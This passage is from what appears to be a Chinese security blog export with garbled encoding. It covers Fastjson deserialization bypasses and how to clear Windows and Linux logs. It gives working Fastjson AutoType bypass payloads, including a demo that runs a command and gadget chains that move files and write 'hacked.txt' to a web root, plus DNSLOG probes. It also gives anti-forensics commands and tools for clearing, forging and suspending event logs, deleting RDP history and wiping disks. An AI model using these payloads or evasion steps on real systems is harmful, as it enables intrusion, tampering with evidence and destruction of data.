QAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;], &quot;_name&quot; : &quot;a&quot;, &quot;_tfactory&quot; : &#123;&#125;, &quot;outputProperties&quot; : &#123;&#125;&#125; 1.2.44æ›´æ–°æœºåˆ¶44ç‰ˆæœ¬é’ˆå¯¹43ç‰ˆæœ¬çš„ç»•è¿‡ä½œäº†å¤„ç†ï¼Œ[ å¼€å¤´æˆ–è€… L å¼€å¤´ ; ç»“å°¾éƒ½ä¼šæŠ›å‡ºå¼‚å¸¸ BypassJSONå†…ç½®å®Œç¾å‡»ç ´ 1.2.47-67æ›´æ–°æœºåˆ¶ç”±äº47ä¿®å¤äº†JSONå†…ç½®ç»•è¿‡ï¼Œè¿™äº›ç‰ˆæœ¬é‡Œä¹Ÿæ²¡å•¥å¾ˆå¥½çš„ç»•è¿‡æ–¹æ³•ï¼Œç½‘ä¸Šå¤šæ˜¯ä»é»‘åå•ä¸­ç»“åˆJNDIæ³¨å…¥æ‰¾æ¼ç½‘ä¹‹é±¼ï¼ˆæ‰¾åˆ°çš„å¤šä¸ºç»„ä»¶ç±»ï¼Œéœ€è¦ç›®æ ‡æœºå™¨ä¸Šæœ‰è¯¥ç»„ä»¶æ‰èƒ½æ‰“https://paper.seebug.org/1155/ï¼‰ä»¥åŠexpectClassç»•è¿‡AutoType 1.2.6868ç‰ˆæœ¬ä¹‹åå‡ºç°äº†æ–°çš„å®‰å…¨æ§åˆ¶ç‚¹safeModeï¼Œå¦‚æœå¼€å¯ï¼Œåœ¨checkAtuoTypeçš„æ—¶å€™ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œåªè¦è®¾ç½®@typeç±»å‹ï¼Œæƒ³ååºåˆ—åŒ–æŒ‡å®šç±»å¯¹è±¡çš„æ—¶å€™ï¼Œå°±ä¼šæŠ›å¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯è¯´å¼€äº†safemodçš„ç«™å¯ä»¥ä¸ç”¨çœ‹äº†ã€‚å½“ç„¶è¿™ä¸ªç‰ˆæœ¬expectClassç»•è¿‡AutoTypeæ˜¯å¯ä»¥æ‰“ä¸€æ‰“çš„ã€‚ Bypass expectClassç»•è¿‡AutoType &lt;=1.2.68è¿™é‡Œé€šè¿‡ä¸€ä¸ªdemoå±•ç¤ºä¸€ä¸‹. package org.example;import java.io.IOException;public class VulAutoCloseable implements AutoCloseable &#123; public VulAutoCloseable()&#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; @Override public void close() throws Exception &#123; &#125;&#125; ç„¶åæˆ‘ä»¬çš„payload public class evil &#123; public static void main(String[] args)&#123; System.out.println(JSON.parseObject(&quot;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.AutoCloseable\\&quot;,\\&quot;@type\\&quot;:\\&quot;org.example.VulAutoCloseable\\&quot;,\\&quot;cmd\\&quot;:\\&quot;calc\\&quot;&#125;\\n&quot;)); &#125; &#125; æ‰§è¡Œåå¼¹è®¡ç®—å™¨ æˆ‘ä»¬é€šè¿‡è°ƒè¯•æ¥çœ‹çœ‹å…·ä½“æ˜¯æ€ä¹ˆä¸ªå›äº‹ è°ƒè¯•äºcheckautotype å¤„ä¸‹æ–­ç‚¹ã€‚ å¯ä»¥å‘ç°ä¼ å…¥çš„typenameæ˜¯ AutoCloseableã€‚æ­¤æ—¶çš„expectClassæ˜¯NULL å¾€ä¸‹ï¼Œç›´æ¥ä»ç¼“å­˜Mappingå¯ä»¥ç›´æ¥è·å¾—æ­¤ç±»ï¼Œ ç„¶åç›´æ¥è¢«returnäº†ï¼Œç”šè‡³æ²¡æœ‰èµ°autoTypeSupportæ ¡éªŒã€‚ clazzè¢«returnåˆ°äº†defaultjsonparseré‡Œï¼Œå¾€ä¸‹çœ‹é€»è¾‘å¯ä»¥å‘ç°ä»å¯¹clazzè¿›è¡Œäº†ä¸€ä¸ªdeserialzeæ–¹æ³•ï¼Œè·Ÿè¿› ä¼šè·Ÿåˆ°è¿™é‡Œæ¥ å¾€ä¸‹çœ‹ï¼Œä¼šå› ä¸ºç”±Autocloseableä¸èƒ½é€šè¿‡getSeeAlsoæ–¹æ³•æˆåŠŸç”Ÿæˆdeserializerå¯¹è±¡ï¼Œä»è€Œè§¦å‘ç¬¬äºŒè½®checkAutoType ç¬¬äºŒè½®ä¼ å…¥checkAutoTypeçš„å‚æ•°ä¾æ¬¡ä¸º ç¬¬äºŒä¸ª@typeå€¼ï¼Œç¬¬ä¸€ä¸ª@typeå€¼ï¼Œå’Œä¸€ä¸ªä¸é‡è¦çš„lexer.getFeatures() è¿›æ¥checkAutoTypeåï¼Œä¼šå…ˆå¯¹exceptclassè¿›è¡Œç™½åå•æ ¡éªŒï¼ŒAutocloseableç±»è‡ªç„¶æ˜¯éšä¾¿è¿‡æ‰ï¼Œç„¶åä½¿exceptClassFlagç½®ä¸ºtrue éšåä¾¿æ˜¯ä¸€äº›å¯¹typenameçš„é»‘ç™½åå•æ ¡éªŒï¼Œç”±äºtypenameæ˜¯org.example.VulAutoCloseableï¼Œä¸åœ¨é»‘ç™½åå•ä¸­ï¼Œæ‰€ä»¥æ ¡éªŒè‡ªç„¶éƒ½é€šè¿‡äº†ã€‚ä»¥ä¸‹æ˜¯ä¾æ¬¡çš„æ ¡éªŒé¡ºåº é»‘åå•æ ¡éªŒ å…ˆç™½åé»‘ï¼Œå…¶ä¸­æ‰€æœ‰çš„Array.binarySearchç»“æœéƒ½æ˜¯0ï¼Œè‡ªç„¶å°±èƒ½é€šè¿‡IFæ¡ä»¶ å…ˆé»‘åç™½ å†²ç ´é‡é‡è€ƒç ”ï¼ŒtypenameæŒ‡å®šç±»è¢«ä¼ å…¥TypeUtils.loadClass,è·Ÿè¿› ä¼šæ¥åˆ°è¿™é‡Œï¼ŒVulAutoCloseableçš„ç±»å¯¹è±¡è¢«è¿”å› ç„¶åä¼šå¯¹è¿™ä¸ªç±»å¯¹è±¡è¿›è¡Œæ ¡éªŒï¼Œæ ¡éªŒæ˜¯å¦ä¸ºClassLoaderã€DataSourceã€RowSetç­‰ç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™ä¹Ÿæ˜¯è¿‡æ»¤å¤§å¤šæ•°JNDIæ³¨å…¥Gadgetçš„æœºåˆ¶ï¼š ç„¶ååˆ¤æ–­clazzæ˜¯å¦æ˜¯exceptClassçš„å­ç±»ï¼Œæ˜¯çš„è¯å°±ç›´æ¥è¿”å›ç±»å¯¹è±¡ã€‚ç±»å¯¹è±¡è¢«è¿”å›åï¼Œå°±ä¼šè¿›å…¥è¢«ååºåˆ—åŒ–çš„ä¸‹ä¸€ä¸ªè¿‡ç¨‹ï¼Œå®ƒçš„æ„é€ æ–¹æ³•ç­‰ä¼šè¢«è°ƒç”¨ï¼Œä»è€Œå®Œæˆåˆ©ç”¨ã€‚ å®æˆ˜Gadgetå®æˆ˜ä¸­ç”¨çš„payload: æ–‡ä»¶ç§»åŠ¨ï¼šå°†ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹ç§»åŠ¨åˆ°æ–°çš„ä¸€ä¸ªæ–‡ä»¶ä¸­å»ï¼ŒåŸæ¥æ–‡ä»¶çš„å†…å®¹æ¶ˆå¤±ã€‚ &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjtools&lt;&#x2F;artifactId&gt; &lt;version&gt;1.9.5&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; &#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;D:&#x2F;b.txt&quot;, &quot;targetPath&quot;:&quot;E:&#x2F;b.txt&quot;&#125; æ–‡ä»¶å†™å…¥ &lt;dependency&gt; &lt;groupId&gt;com.sleepycat&lt;&#x2F;groupId&gt; &lt;artifactId&gt;je&lt;&#x2F;artifactId&gt; &lt;version&gt;5.0.73&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.esotericsoftware&lt;&#x2F;groupId&gt; &lt;artifactId&gt;kryo&lt;&#x2F;artifactId&gt; &lt;version&gt;4.0.0&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjtools&lt;&#x2F;artifactId&gt; &lt;version&gt;1.9.5&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; &#123; &quot;stream&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;targetPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;hacked.txt&quot;, \\\\åˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶ &quot;tempPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;test.txt&quot;\\\\åˆ›å»ºä¸€ä¸ªæœ‰å†…å®¹çš„æ–‡ä»¶ &#125;, &quot;writer&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;, &quot;buffer&quot;: &quot;cHduZWQ&#x3D;&quot;, \\\\base64åçš„æ–‡ä»¶å†…å®¹ &quot;outputStream&quot;: &#123; &quot;$ref&quot;: &quot;$.stream&quot; &#125;, &quot;position&quot;: 5 &#125;, &quot;close&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;, &quot;out&quot;: &#123; &quot;$ref&quot;: &quot;$.writer&quot; &#125; &#125;&#125; æ¼æ´æ£€æµ‹DNSLOG&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog.cn&quot;&#125; åœ¨49ä»¥ä¸‹æ‰èƒ½è§¦å‘ï¼Œå› ä¸ºè¿™ä¸ªgadgetåœ¨49è¢«ç¦æ­¢äº†ï¼Œå¯ç”¨äºæ£€æµ‹å…·ä½“ç‰ˆæœ¬&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0 æŠ¥é”™æ£€æµ‹è¿æ°”å¥½å¯ä»¥ç›´æ¥å‡ºç‰ˆæœ¬å· &#123;&quot;xxx&quot;:&quot;aaa&quot;eyJhIjoiXHgaGiJ9çš„base64è§£ç  åœ¨60ä»¥ä¸‹æ‰èƒ½è§¦å‘ï¼Œå½“åç«¯ Fastjson ç‰ˆæœ¬å°äº 1.2.60 æ—¶ï¼Œä½¿ç”¨è¯¥è¯·æ±‚åŒ…ä¸ä¼šå»¶æ—¶ä¸ä¼šæŠ¥é”™ï¼Œåä¹‹åˆ™ä¼šå»¶è¿Ÿæˆ–æŠ¥é”™ å»ºè®®æœ‰äº›å¼€å‘äººå‘˜åœ¨å†™è§£æJSONçš„ç›¸å…³ä»£ç æ—¶ï¼Œå¯èƒ½ä¼šè®¾ç½®åªèƒ½ä¼ å…¥æŒ‡å®šå¯¹è±¡ã€‚è€Œæˆ‘ä»¬é€šè¿‡è®¾ç½®@typeæ—¶ä¼ å…¥çš„å¯¹è±¡å¯èƒ½ä¼šä¸æŒ‡å®šå¯¹è±¡ä¸åŒ¹é…ä»è€Œå‘ç”Ÿtype not matchçš„å¼‚å¸¸ã€‚ è§£å†³åŠæ³•æ˜¯è¿™æ ·,æœ€å¤–å±‚å¥—å±‚å¯¹è±¡ &#123;&quot;xxx&quot;: &#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; å‚è€ƒhttps://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html https://www.freebuf.com/vuls/228099.html https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87 https://paper.seebug.org/1192/#1225 https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89","categories":[],"tags":[{"name":"javaå¼€å‘ä¸å®‰å…¨","slug":"javaå¼€å‘ä¸å®‰å…¨","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"win&linux æ—¥å¿—ç³»ç»Ÿä¸æ¸…é™¤","slug":"windows&linuxæ—¥å¿—ç³»ç»Ÿä¸æ¸…é™¤","date":"2021-09-03T13:09:34.996Z","updated":"2021-09-03T13:17:41.118Z","comments":true,"path":"2021/09/03/windows&linuxæ—¥å¿—ç³»ç»Ÿä¸æ¸…é™¤/","link":"","permalink":"http://const27.com/2021/09/03/windows&linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/","excerpt":"","text":"WINDOWS æ—¥å¿—Windowsæ—¥å¿—æœ‰è®¸å¤šç»†åˆ†ç±»ï¼šwindowsäº‹ä»¶æ—¥å¿—ï¼ŒIISæ—¥å¿—ï¼ŒFTPæ—¥å¿—ï¼Œé˜²ç«å¢™æ—¥å¿—ç­‰ç­‰ã€‚ äº‹ä»¶æŸ¥çœ‹å™¨windowsç³»ç»Ÿè‡ªå¸¦ä¸€ä¸ªå«åšäº‹ä»¶æŸ¥çœ‹å™¨çš„å·¥å…·ï¼Œå®ƒå¯ä»¥åˆ†ææ‰€æœ‰çš„windowsç³»ç»Ÿæ—¥å¿—ã€‚è¿è¡Œ-&gt;eventvwr å³å¯æ‰“å¼€ã€‚å®ƒæŠŠæ—¥å¿—åˆ†ä¸ºäº†ä¸¤ç§ï¼Œä¸€ä¸ªæ˜¯WINDOWSæ—¥å¿—ï¼Œä¸€ä¸ªæ˜¯â€œåº”ç”¨ç¨‹åºå’ŒæœåŠ¡æ—¥å¿—â€ äº‹ä»¶æŸ¥çœ‹å™¨å†…ç½®æœ‰ä¸‰ä¸ªæ ¸å¿ƒæ—¥å¿—æ–‡ä»¶ï¼šSYSTEM,SECURITY,APPLICATIONã€‚ä»–ä»¬çš„é»˜è®¤æœ€å¤§å®¹é‡ä¸º20MB. äº‹ä»¶ç±»å‹ äº‹ä»¶æŸ¥çœ‹å™¨æŠŠæ—¶é—´åˆ†ç±»ä¸ºäº†äº”ç§ç±»å‹ï¼š ä¿¡æ¯ï¼ˆInformationï¼‰ ä¿¡æ¯äº‹ä»¶æŒ‡åº”ç”¨ç¨‹åºã€é©±åŠ¨ç¨‹åºæˆ–æœåŠ¡çš„æˆåŠŸæ“ä½œçš„äº‹ä»¶ã€‚ è­¦å‘Šï¼ˆWarningï¼‰ è­¦å‘Šäº‹ä»¶æŒ‡ä¸æ˜¯ç›´æ¥çš„ã€ä¸»è¦çš„ï¼Œä½†æ˜¯ä¼šå¯¼è‡´å°†æ¥é—®é¢˜å‘ç”Ÿçš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå½“ç£ç›˜ç©ºé—´ä¸è¶³æˆ–æœªæ‰¾åˆ°æ‰“å°æœºæ—¶ï¼Œéƒ½ä¼šè®°å½•ä¸€ä¸ªâ€œè­¦å‘Šâ€äº‹ä»¶ã€‚ é”™è¯¯ï¼ˆErrorï¼‰ é”™è¯¯äº‹ä»¶æŒ‡ç”¨æˆ·åº”è¯¥çŸ¥é“çš„é‡è¦çš„é—®é¢˜ã€‚é”™è¯¯äº‹ä»¶é€šå¸¸æŒ‡åŠŸèƒ½å’Œæ•°æ®çš„ä¸¢å¤±ã€‚ä¾‹å¦‚,å¦‚æœä¸€ä¸ªæœåŠ¡ä¸èƒ½ä½œä¸ºç³»ç»Ÿå¼•å¯¼è¢«åŠ è½½ï¼Œé‚£ä¹ˆå®ƒä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯äº‹ä»¶ã€‚ æˆåŠŸå®¡æ ¸ï¼ˆSuccess auditï¼‰ æˆåŠŸçš„å®¡æ ¸å®‰å…¨è®¿é—®å°è¯•ï¼Œä¸»è¦æ˜¯æŒ‡å®‰å…¨æ€§æ—¥å¿—ï¼Œè¿™é‡Œè®°å½•ç€ç”¨æˆ·ç™»å½•/æ³¨é”€ã€å¯¹è±¡è®¿é—®ã€ç‰¹æƒä½¿ç”¨ã€è´¦æˆ·ç®¡ç†ã€ç­–ç•¥æ›´æ”¹ã€è¯¦ç»†è·Ÿè¸ªã€ç›®å½•æœåŠ¡è®¿é—®ã€è´¦æˆ·ç™»å½•ç­‰äº‹ä»¶ï¼Œä¾‹å¦‚æ‰€æœ‰çš„æˆåŠŸç™»å½•ç³»ç»Ÿéƒ½ä¼šè¢«è®°å½•ä¸ºâ€œ æˆåŠŸå®¡æ ¸â€äº‹ä»¶ã€‚ å¤±è´¥å®¡æ ¸ï¼ˆFailure auditï¼‰ å¤±è´¥çš„å®¡æ ¸å®‰å…¨ç™»å½•å°è¯•ï¼Œä¾‹å¦‚ç”¨æˆ·è¯•å›¾è®¿é—®ç½‘ç»œé©±åŠ¨å™¨å¤±è´¥ï¼Œåˆ™è¯¥å°è¯•ä¼šè¢«ä½œä¸ºå¤±è´¥å®¡æ ¸äº‹ä»¶è®°å½•ä¸‹æ¥ã€‚ åˆ é™¤æ—¥å¿—Windowså¹¶æ²¡æœ‰ç›´æ¥æä¾›åˆ é™¤ç‰¹ç‚¹æ—¥å¿—çš„åŠŸèƒ½ï¼Œäº‹ä»¶æŸ¥çœ‹å™¨ä¹Ÿåªæä¾›äº†ä¸€ä¸ªæ¸…é™¤æ—¥å¿—çš„é€‰é¡¹ï¼ŒåŸå› æ˜¯æ—¥å¿—è®°å½•çš„IDæ˜¯è¿ç»­çš„ï¼Œé»˜è®¤çš„æ’åºæ–¹å¼æ˜¯ä»å¤§åˆ°å°å¾€ä¸‹æ’åˆ—ã€‚ æ¸…ç©ºæ—¥å¿—æš´åŠ›ä¸€ç‚¹ï¼Œå¯ä»¥ç›´æ¥æŠŠæ—¥å¿—å…¨éƒ¨åˆ é™¤ã€‚ å¼€å§‹â†’è¿è¡Œ,è¾“å…¥ eventvwr è¿›å…¥äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œå³è¾¹æ é€‰æ‹©æ¸…é™¤æ—¥å¿—ã€‚ æˆ–è€…é€šè¿‡powershellé€‰å®šæ—¥å¿—åˆ é™¤ ï¼ˆaï¼‰PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security,&#39;windows powershell&#39;&#125;&quot;ï¼ˆbï¼‰Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125; å«Œpowershellå¤ªé•¿å¯ä»¥ç”¨wevtutil wevtutil el åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰æ—¥å¿—åç§°wevtutil cl system æ¸…ç†ç³»ç»Ÿæ—¥å¿—wevtutil cl application æ¸…ç†åº”ç”¨ç¨‹åºæ—¥å¿—wevtutil cl security æ¸…ç†å®‰å…¨æ—¥å¿— æ—¥å¿—ä¼ªé€ å¯ä»¥é€šè¿‡eventcreateè¿™ä¸ªè‡ªå¸¦å·¥å…·ä¼ªé€ æ—¥å¿—æˆ–è€…è‡ªå®šä¹‰å¤§é‡åƒåœ¾ä¿¡æ¯è¦†ç›–ç°æœ‰æ—¥å¿—ï¼ˆæ—¥å¿—æœ€å¤§å®¹é‡20MBï¼‰ eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500 æš‚åœæ—¥å¿—è®°å½•å¯ä»¥é€šè¿‡å·¥å…·https://github.com/hlldz/Invoke-Phant0mï¼Œæ¥ä½¿æ—¥å¿—è®°å½•ç»ˆæ­¢ã€‚è¿™ä¸ªå·¥å…·ä»…æ”¯æŒX64 è¯¥è„šæœ¬éå†äº‹ä»¶æ—¥å¿—æœåŠ¡è¿›ç¨‹ï¼ˆä¸“ç”¨svchost.exeï¼‰çš„çº¿ç¨‹å †æ ˆï¼Œå¹¶æ ‡è¯†äº‹ä»¶æ—¥å¿—çº¿ç¨‹ä»¥æ€æ­»äº‹ä»¶æ—¥å¿—æœåŠ¡çº¿ç¨‹ã€‚å› æ­¤ï¼Œç³»ç»Ÿå°†æ— æ³•æ”¶é›†æ—¥å¿—ã€‚ éšåæ–°å¢ç”¨æˆ·ï¼Œå‘ç°æ—¥å¿—ä¸­æ— è®°å½•ï¼Œçœ‹æ¥æ—¥å¿—è®°å½•ç¡®å®æ˜¯è¢«ç»ˆæ­¢äº†ã€‚ å•æ¡æ—¥å¿—æ¸…é™¤https://github.com/QAX-A-Team/EventCleaner è¿™ä¸ªå·¥å…·ä¹Ÿå¯ä»¥æš‚åœæ—¥å¿—çº¿ç¨‹åœæ­¢æ—¥å¿—è®°å½•ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ¢å¤æ—¥å¿—çº¿ç¨‹ã€‚ä½†æ˜¯æ›´é‡è¦çš„æ˜¯å®ƒå¯ä»¥åˆ é™¤å•æŒ‘æ—¥å¿—è®°å½• å®˜æ–¹æè¿° EventCleaner closehandle è§£é™¤ security.evtxçš„æ–‡ä»¶å å‘ EventCleaner 100 åˆ é™¤IDä¸º100çš„æ—¥å¿—(å¿…é¡»åœ¨ä¹‹å‰ä½¿ç”¨EventCleaner closehandle) EventCleaner suspend æš‚åœæ—¥å¿—çº¿ç¨‹,åœæ­¢æ—¥å¿—è®°å½• do anything without worrying about logs EventCleaner normal æ¢å¤æ—¥å¿—çº¿ç¨‹ delete EventCleaner å„æ—¥å¿—ä½ç½®åŠæ‰‹åŠ¨æ¸…é™¤IISè·¯å¾„ %SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\ æ¸…é™¤WWWæ—¥å¿—(å…¶å®å¹¶ä¸éœ€è¦åœæ­¢æœåŠ¡éƒ½èƒ½åˆ )ï¼š åœæ­¢æœåŠ¡ï¼šnet stop w3svcåˆ é™¤æ—¥å¿—ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼šdel *.*å¯ç”¨æœåŠ¡ï¼šnet start w3svc åº”ç”¨ç¨‹åºæ—¥å¿—ï¼Œå®‰å…¨æ—¥å¿—ï¼Œç³»ç»Ÿæ—¥å¿—%systemroot%\\system32\\config\\AppEvent.EVT;%systemroot%\\system32\\config\\SecEvent.EVT;%systemroot%\\system32\\config\\SysEvent.EVT; ftp%systemroot%\\system32\\logfiles\\msftpsvc1\\ è¿œç¨‹æ¡Œé¢ç›´æ¥å«–è„šæœ¬ @echo offreg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default&quot; &#x2F;va &#x2F;f # åˆ é™¤Defaultä¸­çš„æ‰€æœ‰å€¼reg delete &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot; &#x2F;f # åˆ é™¤æ•´ä¸ªServersreg add &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot; é‡æ–°åˆ›å»ºåˆ é™¤çš„æ³¨å†Œè¡¨é¡¹cd %userprofile%\\documents\\ # è½¬åˆ°Default.rdpæ–‡ä»¶ç›®å½•attrib Default.rdp -s -h # æ›´æ”¹Default.rdpæ–‡ä»¶å±æ€§ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒæ˜¯éšè—del Default.rdp # åˆ é™¤æ–‡ä»¶Default.rdpæ–‡ä»¶ å½»åº•åˆ é™¤æ—¥å¿—å¦‚ä½•å½»åº•åˆ é™¤æ—¥å¿—ï¼Ÿè¦çŸ¥é“ä»…ä»…æ˜¯æ™®é€šçš„åˆ é™¤å‘½ä»¤å®é™…ä¸Šæ˜¯å¹¶ä¸èƒ½åšåˆ°å®Œå…¨åˆ é™¤çš„ï¼Œå¾ˆå®¹æ˜“è¢«æ‰¾åˆ°åˆ é™¤æ–‡ä»¶ã€‚ Cipher å‘½ä»¤å¤šæ¬¡è¦†å†™åœ¨åˆ é™¤æ–‡ä»¶åï¼Œå¯ä»¥åˆ©ç”¨Cipher å‘½ä»¤é€šè¿‡ /W å‚æ•°å¯åå¤å†™å…¥å…¶ä»–æ•°æ®è¦†ç›–å·²åˆ é™¤æ–‡ä»¶çš„ç¡¬ç›˜ç©ºé—´ï¼Œå½»åº•åˆ é™¤æ•°æ®é˜²æ­¢è¢«æ¢å¤ã€‚æ¯”å¦‚ åˆšåˆšåˆ é™¤D:\\toolsç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæ‰§è¡Œcipher /w:D:\\toolsï¼ŒD ç›˜ä¸Šæœªä½¿ç”¨ç©ºé—´å°±ä¼šè¢«è¦†ç›–ä¸‰æ¬¡ï¼šä¸€æ¬¡ 0x00ã€ä¸€æ¬¡ 0xFFï¼Œä¸€æ¬¡éšæœºæ•°ï¼Œæ‰€æœ‰è¢«åˆ é™¤çš„æ–‡ä»¶å°±éƒ½ä¸å¯èƒ½è¢«æ¢å¤äº†ã€‚ Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ–Format å‘½ä»¤åŠ ä¸Š /P å‚æ•°åï¼Œå°±ä¼šæŠŠæ¯ä¸ªæ‰‡åŒºå…ˆæ¸…é›¶ï¼Œå†ç”¨éšæœºæ•°è¦†ç›–ã€‚è€Œä¸”å¯ä»¥è¦†ç›–å¤šæ¬¡ã€‚æ¯”å¦‚ format D: /P:8å°±è¡¨ç¤ºæŠŠ D ç›˜ç”¨éšæœºæ•°è¦†ç›– 8 æ¬¡ã€‚ LINUX æ—¥å¿—/var/log/message ç³»ç»Ÿå¯åŠ¨åçš„ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿—ï¼Œæ˜¯Red Hat Linuxä¸­æœ€å¸¸ç”¨çš„æ—¥å¿—ä¹‹ä¸€/var/log/secure ä¸å®‰å…¨ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯/var/log/maillog ä¸é‚®ä»¶ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯/var/log/cron ä¸å®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯/var/log/spooler ä¸UUCPå’Œnewsè®¾å¤‡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯/var/log/boot.log å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨å’Œåœæ­¢ç›¸å…³çš„æ—¥å¿—æ¶ˆæ¯/var/log/wtmp è¯¥æ—¥å¿—æ–‡ä»¶æ°¸ä¹…è®°å½•æ¯ä¸ªç”¨æˆ·ç™»å½•ã€æ³¨é”€åŠç³»ç»Ÿçš„å¯åŠ¨ã€åœæœºçš„äº‹ä»¶,ç”¨lastæŸ¥çœ‹/var/log/btmp è®°å½•æ‰€æœ‰ç™»å½•å¤±è´¥ä¿¡æ¯ï¼Œä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹/var/log/lastlog è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹/var/log/utmp 